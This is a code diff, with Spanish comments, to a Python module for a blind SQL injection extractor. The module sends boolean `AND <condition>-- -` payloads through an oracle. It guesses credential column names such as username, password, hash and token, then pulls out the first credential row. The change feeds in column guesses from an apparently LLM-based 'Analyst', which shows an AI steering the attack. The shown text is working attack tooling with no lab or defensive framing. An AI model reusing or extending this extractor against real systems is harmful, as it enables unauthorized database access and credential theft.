@@ -8,13 +8,12 @@ Habla con el exterior por un `oracle(payload) -> bool` que devuelve True si la c
 es verdadera (el objetivo devuelve fila)."""
 from __future__ import annotations
 
-from typing import Callable, Optional
-
-from . import knowledge
+from typing import Callable, Optional, Sequence
 
 _HEX = "0123456789abcdef"
 _PRINTABLE = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$^&*()-_+=.,:@/ "
-# Respaldo mínimo si la wordlist de sqlmap no está disponible (knowledge ya cae a esto).
+# Respaldo MÍNIMO de emergencia, solo si no llegan candidatos de fuera (p. ej. LLM caído y sin
+# dataset). En operación normal los candidatos los propone el Analyst (LLM) y los aterriza sqlmap.
 _USER_COLS = ("user", "username", "login", "name", "email", "uname", "account")
 _PASS_COLS = ("password", "pass", "pwd", "passwd", "secret", "hash", "token")
 
@@ -22,11 +21,16 @@ Oracle = Callable[[str], bool]
 
 
 class BlindExtractor:
-    def __init__(self, oracle: Oracle, quote: str = "", say: Optional[Callable[[str], None]] = None):
+    def __init__(self, oracle: Oracle, quote: str = "", say: Optional[Callable[[str], None]] = None,
+                 user_cols: Optional[Sequence[str]] = None,
+                 pass_cols: Optional[Sequence[str]] = None):
         self.oracle = oracle
         self.q = quote
         self.say = say or (lambda _m: None)
         self.requests = 0
+        # Candidatos de nombre de columna (del Analyst/sqlmap); respaldo mínimo si no llegan.
+        self.user_cols = tuple(user_cols) if user_cols else _USER_COLS
+        self.pass_cols = tuple(pass_cols) if pass_cols else _PASS_COLS
 
     def _cond(self, condition: str) -> bool:
         """Envía `1{q} AND <condition>-- -` y devuelve si fue verdadera (hubo fila)."""
@@ -67,14 +71,10 @@ class BlindExtractor:
         """Descubre columnas de credenciales (probando nombres comunes con LIKE) y extrae la 1ª fila."""
         if not self.confirm():
             return None
-        # Candidatos de nombre de columna de la wordlist de sqlmap (common-columns), priorizados;
-        # así el agente "adivina" las columnas con un dataset real cuando information_schema no se
-        # puede leer (modo --common-columns de sqlmap). Respaldo: lista mínima.
-        user_cands, pass_cands = knowledge.credential_column_candidates()
-        self.say(f"[Blind] wordlist de columnas (sqlmap): {len(user_cands)} candidatas usuario, "
-                 f"{len(pass_cands)} candidatas password")
-        user_col = self.find_column(user_cands or _USER_COLS)
-        pass_col = self.find_column(pass_cands or _PASS_COLS)
+        # Los candidatos los propuso el Analyst (LLM) y los aterrizó sqlmap; aquí solo se confirma
+        # cuál existe, sondeando `col LIKE 0x25` por cada nombre.
+        user_col = self.find_column(self.user_cols)
+        pass_col = self.find_column(self.pass_cols)
         self.say(f"[Blind] columnas halladas: usuario={user_col!r} password={pass_col!r}")
         if not pass_col:
             return None
